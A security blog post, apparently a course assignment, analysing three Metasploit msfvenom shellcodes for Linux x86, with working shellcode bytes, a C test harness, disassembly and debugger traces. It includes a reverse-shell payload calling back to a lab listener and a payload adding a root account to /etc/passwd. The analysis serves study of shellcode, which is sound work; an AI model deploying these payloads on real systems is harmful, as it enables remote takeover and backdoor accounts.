<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Msfvenom shellcode analysis - hackcommander.io</title>
<meta name="description" content="This blog post provides an analysis of various common shellcodes generated by the msfvenom utility which is part of Metasploit.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Msfvenom shellcode analysis">
<meta property="og:url" content="http://localhost:4000/msfvenom-shellcode-analysis/">


  <meta property="og:description" content="This blog post provides an analysis of various common shellcodes generated by the msfvenom utility which is part of Metasploit.">



  <meta property="og:image" content="http://localhost:4000/assets/images/slae32.png">





  <meta property="article:published_time" content="2018-11-29T00:00:00+01:00">





  

  


<link rel="canonical" href="http://localhost:4000/msfvenom-shellcode-analysis/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Msfvenom shellcode analysis</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Msfvenom shellcode analysis">
    <meta itemprop="description" content="This blog post provides an analysis of various common shellcodes generated by the msfvenom utility which is part of Metasploit.">
    <meta itemprop="datePublished" content="November 29, 2018">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Msfvenom shellcode analysis
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2018-11-29T00:00:00+01:00">November 29, 2018 </time>&emsp;
          
          
        </p>
        <p>This blog post provides an analysis of various common shellcodes generated by the <code class="language-plaintext highlighter-rouge">msfvenom</code> utility which is part of Metasploit.</p>

<ul>
  <li><a href="#shellcode-analysis-1-linuxx86exec"># Shellcode analysis #1: linux/x86/exec</a></li>
  <li><a href="#stepping-through-the-shellcode">Stepping through the shellcode</a></li>
  <li><a href="#shellcode-analysis-2-linuxx86shellreversetcp"># Shellcode analysis #2: linux/x86/shell_reverse_tcp</a></li>
  <li><a href="#stepping-through-the-shellcode-1">Stepping through the shellcode</a></li>
  <li><a href="#shellcode-analysis-3-linuxx86adduser"># Shellcode analysis #3: linux/x86/adduser</a></li>
  <li><a href="#stepping-through-the-shellcode-2">Stepping through the shellcode</a></li>
</ul>

<h1 id="shellcode-analysis-1-linuxx86exec">Shellcode analysis #1: linux/x86/exec</h1>
<hr />

<p>The <code class="language-plaintext highlighter-rouge">linux/x86/exec</code> msfvenom payload simply executes an arbitrary program configured with the <code class="language-plaintext highlighter-rouge">CMD</code> parameter.</p>

<p>The payload for this analysis was generated as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/1_exec$ msfvenom -p linux/x86/exec -f c -o exec_shellcode CMD=/usr/bin/id                              
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes
Final size of c file: 224 bytes
Saved as: exec_shellcode
</code></pre></div></div>

<p>Next, it was added to the skeleton test C program that was used for the other assignments.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0c\x00\x00\x00\x2f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x75\x73\x72\x2f\x62\x69\x6e\x2f\x69\x64\x00\x57\x53\x89\xe1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Size: %d bytes.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
    <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The shellcode is compiled with the <code class="language-plaintext highlighter-rouge">-z execstack</code> flag to make the stack executable then tested to make sure it works:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/1_exec$ gcc -z execstack -o shellcode shellcode.c
slemire@slae:~/slae32/assignment5/1_exec$ ./shellcode
Size: 48 bytes.
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">sctest</code> program from <code class="language-plaintext highlighter-rouge">libemu2</code> can be used to emulate the specific instructions in the shellcode and help understand how the shellcode works. As show in the output below, we can clearly see that the shellcode executes the <code class="language-plaintext highlighter-rouge">execve</code> function, using <code class="language-plaintext highlighter-rouge">/bin/sh</code> as the program name. The command <code class="language-plaintext highlighter-rouge">/usr/bin/id</code> that was configured in the payload through msfvenom is executed using the <code class="language-plaintext highlighter-rouge">-c</code> command flag of <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/1_exec$ msfvenom -p linux/x86/exec CMD=/usr/bin/id | sctest -v -Ss 100000
verbose = 1
[...]
execve
int execve (const char *dateiname=00416fc0={/bin/sh}, const char * argv[], const char *envp[]);
cpu error error accessing 0x00000004 not mapped

stepcount 15
int execve (
     const char * dateiname = 0x00416fc0 =&gt; 
           = "/bin/sh";
     const char * argv[] = [
           = 0x00416fb0 =&gt; 
               = 0x00416fc0 =&gt; 
                   = "/bin/sh";
           = 0x00416fb4 =&gt; 
               = 0x00416fc8 =&gt; 
                   = "-c";
           = 0x00416fb8 =&gt; 
               = 0x0041701d =&gt; 
                   = "/usr/bin/id";
           = 0x00000000 =&gt; 
             none;
     ];
     const char * envp[] = 0x00000000 =&gt; 
         none;
) =  0;
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">ndisasm</code> is used to decode the instructions from the shellcode:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/1_exec$ msfvenom -p linux/x86/exec CMD=/usr/bin/id | ndisasm -b 32 -
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 47 bytes

00000000  6A0B              push byte +0xb
00000002  58                pop eax
00000003  99                cdq
00000004  52                push edx
00000005  66682D63          push word 0x632d
00000009  89E7              mov edi,esp
0000000B  682F736800        push dword 0x68732f
00000010  682F62696E        push dword 0x6e69622f
00000015  89E3              mov ebx,esp
00000017  52                push edx
00000018  E80C000000        call dword 0x29
0000001D  2F                das
0000001E  7573              jnz 0x93
00000020  722F              jc 0x51
00000022  62696E            bound ebp,[ecx+0x6e]
00000025  2F                das
00000026  696400575389E1CD  imul esp,[eax+eax+0x57],dword 0xcde18953
0000002E  80                db 0x80
</code></pre></div></div>

<h2 id="stepping-through-the-shellcode">Stepping through the shellcode</h2>

<p>The syscall for <code class="language-plaintext highlighter-rouge">execve</code> is <code class="language-plaintext highlighter-rouge">0xb</code> and needs to be placed into the <code class="language-plaintext highlighter-rouge">$eax</code> register before calling <code class="language-plaintext highlighter-rouge">int 0x80</code>. It could be done with <code class="language-plaintext highlighter-rouge">mov eax, 0xb</code> but this uses a longer shellcode, so instead the <code class="language-plaintext highlighter-rouge">push</code> and <code class="language-plaintext highlighter-rouge">pop</code> instructions are used to place the <code class="language-plaintext highlighter-rouge">0xb</code> in the <code class="language-plaintext highlighter-rouge">$eax</code> register.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0xb</span>          <span class="c1">; top of stack = 0xb</span>
<span class="nf">pop</span> <span class="nb">eax</span>                 <span class="c1">; eax -&gt; 0xb</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">$edx</code> register will be set to null since we don’t need to pass any environment variables to the program that is executed. Using the <code class="language-plaintext highlighter-rouge">cdq</code> instruction is a little trick to further reduce the shellcode size. It extends the sign bit of the <code class="language-plaintext highlighter-rouge">$eax</code> register (which is not set since its value is <code class="language-plaintext highlighter-rouge">0xb</code>) into the <code class="language-plaintext highlighter-rouge">$edx</code> register, effectively changing it to zero.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">cdq</span>                     <span class="c1">; edx -&gt; 0</span>
<span class="nf">push</span> <span class="nb">edx</span>                <span class="c1">; </span>
</code></pre></div></div>

<p>The address of the the 2nd argument <code class="language-plaintext highlighter-rouge">-c</code> is moved into <code class="language-plaintext highlighter-rouge">$edi</code>. This’ll be used later when pushing the arguments on the stack.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">push</span> <span class="kt">word</span> <span class="mh">0x632d</span>        <span class="c1">; const char * argv[] -&gt; "-c"</span>
<span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span><span class="nb">esp</span>             <span class="c1">; </span>
</code></pre></div></div>

<p>The first argument <code class="language-plaintext highlighter-rouge">const char *filename</code> contains a pointer to the filename that’ll be executed. The <code class="language-plaintext highlighter-rouge">/bin/sh</code> is pushed on the stack, then the <code class="language-plaintext highlighter-rouge">$esp</code> value is copied to <code class="language-plaintext highlighter-rouge">$ebx</code> so it’ll be used for the <code class="language-plaintext highlighter-rouge">execve</code> syscall.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x68732f</span>     <span class="c1">; /bin/sh</span>
<span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x6e69622f</span>   <span class="c1">; [...]</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>             <span class="c1">; const char *filename -&gt; "/bin/sh"</span>
<span class="nf">push</span> <span class="nb">edx</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">call</code> instruction first places the address of <code class="language-plaintext highlighter-rouge">/usr/bin/id</code> on the stack then jumps to the instructions following the null byte below.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">E80C000000</span>        <span class="nv">call</span> <span class="kt">dword</span> <span class="mh">0x29</span>         <span class="c1">; push on the stack the address of string "/usr/bin/id"</span>
<span class="err">2</span><span class="nf">F</span>                <span class="nv">das</span>                     <span class="c1">; /usr/bin/id</span>
<span class="err">7573</span>              <span class="nf">jnz</span> <span class="mh">0x93</span>                <span class="c1">; [...]</span>
<span class="err">722</span><span class="nf">F</span>              <span class="nv">jc</span> <span class="mh">0x51</span>                 <span class="c1">; [...]</span>
<span class="err">62696</span><span class="nf">E</span>            <span class="nv">bound</span> <span class="nb">ebp</span><span class="p">,[</span><span class="nb">ecx</span><span class="o">+</span><span class="mh">0x6e</span><span class="p">]</span>    <span class="c1">; [...]</span>
<span class="err">2</span><span class="nf">F</span>                <span class="nv">das</span>                     <span class="c1">; [...]</span>
<span class="err">696400575389</span><span class="nf">E1CD</span>  <span class="nv">imul</span> <span class="nb">esp</span><span class="p">,[</span><span class="nb">eax</span><span class="o">+</span><span class="nb">eax</span><span class="o">+</span><span class="mh">0x57</span><span class="p">],</span><span class="kt">dword</span> <span class="mh">0xcde18953</span> <span class="c1">; [...]</span>
</code></pre></div></div>

<p>After the call instruction, gdb shows that the next instructions push the argv[] in the reverse order:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$eax   : 0xb       
$ebx   : 0xbffff59e  →  "/bin/sh"
$ecx   : 0x7ffffff7
$edx   : 0x0       
$esp   : 0xbffff596  →  0x0804a05d  →  "/usr/bin/id"
$ebp   : 0xbffff5c8  →  0x00000000
$esi   : 0xb7fcc000  →  0x001b1db0
$edi   : 0xbffff5a6  →  0x0000632d ("-c"?)
[...]
0xbffff596│+0x0000: 0x0804a05d  →  "/usr/bin/id"         ← $esp
0xbffff59a│+0x0004: 0x00000000
0xbffff59e│+0x0008: "/bin/sh"
0xbffff5a2│+0x000c: 0x0068732f ("/sh"?)
0xbffff5a6│+0x0010: 0x0000632d ("-c"?)
0xbffff5aa│+0x0014: 0x843a0000
0xbffff5ae│+0x0018: 0x00010804
0xbffff5b2│+0x001c: 0xf6740000
───────────────────────────────────────────────────────── code:x86:32 ────
 →  0x804a069 &lt;shellcode+41&gt;   push   edi
    0x804a06a &lt;shellcode+42&gt;   push   ebx
    0x804a06b &lt;shellcode+43&gt;   mov    ecx, esp
    0x804a06d &lt;shellcode+45&gt;   int    0x80
</code></pre></div></div>

<p>After the <code class="language-plaintext highlighter-rouge">push</code>, the stack looks like this:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xbffff58e│+0x0000: 0xbffff59e  →  "/bin/sh"     ← $esp
0xbffff592│+0x0004: 0xbffff5a6  →  0x0000632d ("-c"?)
0xbffff596│+0x0008: 0x0804a05d  →  "/usr/bin/id"
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">argv[]</code> now contains : <code class="language-plaintext highlighter-rouge">["/bin/sh", "-c", "/usr/bin/id"]</code> and the <code class="language-plaintext highlighter-rouge">$ecx</code> register contains the memory adress of this array.</p>

<p>Finally, <code class="language-plaintext highlighter-rouge">execve</code> is called using the <code class="language-plaintext highlighter-rouge">int 0x80</code> instruction.</p>

<h1 id="shellcode-analysis-2-linuxx86shell_reverse_tcp">Shellcode analysis #2: linux/x86/shell_reverse_tcp</h1>
<hr />

<p>The <code class="language-plaintext highlighter-rouge">linux/x86/shell_reverse_tcp</code> msfvenom payload connects back to a remote machine, executes a shell and redirects output to the socket. This type of payload is commonly used when a firewall restrict incoming connections but allow outbound connections.</p>

<p>The payload for this analysis was generated as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/2_shell_reverse_tcp$ msfvenom -p linux/x86/shell_reverse_tcp -f c -o shell_reverse_tcp_shellcode LHOST=172.23.10.37 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
Saved as: shell_reverse_tcp_shellcode
</code></pre></div></div>

<p>Compiling and verifying that the shellcode works:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/2_shell_reverse_tcp$ gcc -z execstack -o shellcode shellcode.c
slemire@slae:~/slae32/assignment5/2_shell_reverse_tcp$ ./shellcode
Size: 69 bytes.
[...]
slemire@slae:~$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [172.23.10.37] port 4444 [tcp/*] accepted (family 2, sport 53684)
id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
</code></pre></div></div>

<p>With libemu’s <code class="language-plaintext highlighter-rouge">sctest</code> utility, we can see that the shellcode executes the following functions:</p>
<ul>
  <li>socket</li>
  <li>dup2 (duplicate stdin, stdout and stderr descriptors)</li>
  <li>connect</li>
  <li>execve</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/2_shell_reverse_tcp$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.23.10.37 LPORT=4444 | sctest -v -Ss 100000   
verbose = 1
[...]
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int dup2 (
     int oldfd = 14;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 14;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 14;
     int newfd = 0;
) =  0;
int connect (
     int sockfd = 14;
     struct sockaddr_in * serv_addr = 0x00416fbe =&gt; 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 621418412 (host=172.23.10.37);
             };
             char sin_zero = "       ";
         };
     int addrlen = 102;
) =  0;
int execve (
     const char * dateiname = 0x00416fa6 =&gt; 
           = "//bin/sh";
     const char * argv[] = [
           = 0x00416f9e =&gt; 
               = 0x00416fa6 =&gt; 
                   = "//bin/sh";
           = 0x00000000 =&gt; 
             none;
     ];
     const char * envp[] = 0x00000000 =&gt; 
         none;
) =  0;
</code></pre></div></div>

<p>With <code class="language-plaintext highlighter-rouge">ndisasm</code>, we can disassemble the shellcode produced by msfvenom:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/2_shell_reverse_tcp$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.23.10.37 LPORT=4444 | ndisasm -b32 - &gt; shell_reverse_tcp.asm
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes

slemire@slae:~/slae32/assignment5/2_shell_reverse_tcp$ cat shell_reverse_tcp.asm
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
00000018  68AC170A25        push dword 0x250a17ac
0000001D  680200115C        push dword 0x5c110002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
</code></pre></div></div>

<h2 id="stepping-through-the-shellcode-1">Stepping through the shellcode</h2>

<p>First, registers are cleared. The <code class="language-plaintext highlighter-rouge">mul</code> instruction is a shortcut to zero out <code class="language-plaintext highlighter-rouge">eax</code> and <code class="language-plaintext highlighter-rouge">edx</code> with a single instruction.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>           <span class="c1">; ebx = 0</span>
<span class="nf">mul</span> <span class="nb">ebx</span>               <span class="c1">; eax = 0, edx = 0</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">int socket(int domain, int type, int protocol);</code></p>

<p>The socket is created:</p>
<ul>
  <li>AF_INET = IP</li>
  <li>SOCK_STREAM = tcp</li>
</ul>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">inc</span> <span class="nb">ebx</span>               <span class="c1">; ebx = 1 (SYS_SOCKET)</span>
<span class="nf">push</span> <span class="nb">ebx</span>              <span class="c1">; socket() -&gt; type = 1 (SOCK_STREAM)</span>
<span class="nf">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x2</span>        <span class="c1">; socket() -&gt; domain = 2 (AF_INET)</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>           <span class="c1">; socketcall() -&gt; *args</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x66</span>           <span class="c1">; sys_socketcall -&gt; SYS_SOCKET</span>
<span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">int dup2(int oldfd, int newfd)</code></p>

<p>stdin, stdout and stderr are duplicated to the network socket:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">xchg</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">ebx</span>          <span class="c1">; eax = 1, ebx = 3 (fd)</span>
<span class="nf">pop</span> <span class="nb">ecx</span>               <span class="c1">; ecx = 2</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x3f</span>           <span class="c1">; sys_dup2</span>
<span class="nf">int</span> <span class="mh">0x80</span>              <span class="c1">;</span>
<span class="nf">dec</span> <span class="nb">ecx</span>               <span class="c1">;</span>
<span class="nf">jns</span> <span class="mh">0x11</span>              <span class="c1">; loop through stdin, stdout, stderr</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)</code></p>

<p>The socket is then connected to the remote listener <em>172.23.10.37 / 4444</em>:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x250a17ac</span> <span class="c1">; IP: 172.23.10.38</span>
<span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x5c110002</span> <span class="c1">; Port: 4444</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>           <span class="c1">; socketcall() -&gt; *args</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x66</span>           <span class="c1">; sys_socketcall -&gt; SYS_CONNECT</span>
<span class="nf">push</span> <span class="nb">eax</span>              <span class="c1">; socklen_t addrlen = 66 </span>
<span class="nf">push</span> <span class="nb">ecx</span>              <span class="c1">; const struct sockaddr *addr</span>
<span class="nf">push</span> <span class="nb">ebx</span>              <span class="c1">; int sockfd = 3 (fd)</span>
<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span><span class="mh">0x3</span>            <span class="c1">; ebx = 3 (SYS_CONNECT)</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>           <span class="c1">; socketcall() -&gt; *args</span>
<span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">int execve(const char *filename, char *const argv[], char *const envp[])</code></p>

<p>Once the socket is connected, <code class="language-plaintext highlighter-rouge">execve</code> is used to spawn a shell and since the descriptors have previously been duplicated the input and output will be redirected over the network.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">push</span> <span class="nb">edx</span>              <span class="c1">; edx = 0</span>
<span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x68732f6e</span> <span class="c1">; //bin/sh</span>
<span class="nf">push</span> <span class="kt">dword</span> <span class="mh">0x69622f2f</span> <span class="c1">; [...]</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>           <span class="c1">; const char *filename -&gt; /bin/sh</span>
<span class="nf">push</span> <span class="nb">edx</span>              <span class="c1">;</span>
<span class="nf">push</span> <span class="nb">ebx</span>              <span class="c1">;</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>           <span class="c1">; char *const argv[] -&gt; /bin/sh</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0xb</span>            <span class="c1">; sys_execve</span>
<span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>

<h1 id="shellcode-analysis-3-linuxx86adduser">Shellcode analysis #3: linux/x86/adduser</h1>
<hr />

<p>The <code class="language-plaintext highlighter-rouge">linux/x86/adduser</code> shellcode adds a new user to <code class="language-plaintext highlighter-rouge">/etc/passwd</code> with an arbitrary username and password. The password is encoded in traditional descrypt format directly in the file instead of <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</p>

<p>Creating the shellcode</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/3_adduser$ msfvenom -p linux/x86/adduser -f c -o adduser_shellcode USER=slae PASS=slae
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 91 bytes
Final size of c file: 409 bytes
Saved as: adduser_shellcode
</code></pre></div></div>

<p>Verifying that the shellcode works by adding a user <code class="language-plaintext highlighter-rouge">slae</code> with password <code class="language-plaintext highlighter-rouge">slae</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment5/3_adduser$ gcc -z execstack -o shellcode shellcode.c
slemire@slae:~/slae32/assignment5/3_adduser$ sudo ./shellcode
[sudo] password for slemire: 
Size: 92 bytes.
slemire@slae:~/slae32/assignment5/3_adduser$ grep slae /etc/passwd
slae:AzH43ypX/zepc:0:0::/:/bin/sh
</code></pre></div></div>

